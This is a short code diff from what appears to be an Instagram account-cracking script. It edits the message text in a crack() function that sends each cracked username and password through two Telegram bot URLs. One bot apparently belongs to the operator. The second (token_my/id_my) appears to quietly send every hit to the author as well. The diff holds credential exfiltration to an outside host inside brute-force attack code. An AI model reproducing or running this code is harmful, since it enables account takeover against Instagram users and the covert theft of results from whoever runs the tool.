@@ -166,9 +166,9 @@ def crack():
 			print('\033[31m BAD : '+str(r3))
 			print(logo2)
 			sender =user+' : '+pas
-			send_telegram = 'https://api.telegram.org/bot' + token_bot + '/sendMessage?chat_id=' + id_tg + '&parse_mode=Markdown&text=𝙽𝚎𝚠 𝙰𝚌𝚌𝚘𝚞𝚗𝚝𝚜 𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 √\n==========HAMA==========\n[=] User : {user} \n[=] Pass : {pasw}\n===========DARK=========\nCh : m' + sender
+			send_telegram = 'https://api.telegram.org/bot' + token_bot + '/sendMessage?chat_id=' + id_tg + '&parse_mode=Markdown&text=𝙽𝚎𝚠 𝙰𝚌𝚌𝚘𝚞𝚗𝚝𝚜 𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 √\n===========DARK=========\nCh :GOOD<<|' + sender
 			response = requests.get(send_telegram)
-			send_my = 'https://api.telegram.org/bot' + token_my + '/sendMessage?chat_id=' + id_my + '&parse_mode=Markdown&text=𝙽𝚎𝚠 𝙰𝚌𝚌𝚘𝚞𝚗𝚝𝚜 𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 √\n==========HAMA==========\n[=] User : {user} \n[=] Pass : {pasw}\n===========DARK=========\nCh : ' + sender
+			send_my = 'https://api.telegram.org/bot' + token_my + '/sendMessage?chat_id=' + id_my + '&parse_mode=Markdown&text=𝙽𝚎𝚠 𝙰𝚌𝚌𝚘𝚞𝚗𝚝𝚜 𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 √\n===========DARK=========\nCh : GOOD<<|' + sender
 			responsek = requests.get(send_my)
 			r2+=1
 			os.system('clear')
